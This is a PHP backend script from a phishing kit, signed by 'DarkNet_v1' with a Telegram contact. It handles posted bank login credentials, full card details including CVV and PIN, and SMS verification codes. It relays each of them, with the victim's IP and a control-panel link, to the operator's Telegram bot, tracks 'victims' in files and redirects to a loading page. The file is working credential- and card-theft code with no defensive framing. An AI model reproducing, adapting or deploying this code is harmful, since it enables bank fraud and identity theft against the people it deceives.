<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    
    function get_steps_link() {
    
        $ex = explode('/',$_SERVER['REQUEST_URI']);
        array_shift($ex);
        for($i = 1; $i <= 3 ; $i++) {
            array_pop($ex);
        }
        $im = '/' . implode('/',$ex) . '/';
    
        $url = "http://". $_SERVER['HTTP_HOST'] . $im;
        $x = pathinfo($url);
    
        return $ee = $x['dirname'] . '/control.htm?ip=' . get_client_ip();
    }
    
     
    function reset_data() {
        $fp = fopen('../../../victims/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, 0);
        fclose($fp);
    }
	$CHAT_ID = $_COOKIE['idtel'];
    $BOT_TOKEN = $_COOKIE['tokentel'];

    if(isset($_POST["Log"])) {

        $user     = $_POST["user"];
        $pass   = $_POST["pass"];
        
       $message=
       '[🏦] === Login === [🏦]'."\n".
       "[🪪] username : ".$user."\n". 
       "[🔑] Password : ".$pass."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
       '[🛂] Panel-link : '.get_steps_link()."";
       
   
       $data = [
       'chat_id' => $CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".$BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");

    }elseif(isset($_POST["card"])){

        $number = $_POST["num"];
        $exp    = $_POST["exp"];
        $cvv    = $_POST["cvv"];
        $PIN    = $_POST["pin"];
    
    
        $message="
        '[🧛] === Credit Card === [🧛]'.'\n".
        '[💝] Card Number : '.$number."\n".
        '[💝] Expiration Date : '.$exp."\n".
        '[💝] CVV : '.$cvv."\n".
        '[💝] PIN : '.$PIN."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
        
        $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".$BOT_TOKEN."/sendMessage?".http_build_query($data)); 
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = $_POST["sms_code"];
         
        $message=
        '[🧛] === SMS_CODE === [🧛]'."\n".
        '[🏷] SMS : '.$sms."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."";
        
        $data = [
            'chat_id' => $CHAT_ID,
            'text' => $message,
        ]; 
                
        $response = file_get_contents("https://api.telegram.org/bot".$BOT_TOKEN."/sendMessage?".http_build_query($data)); 
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>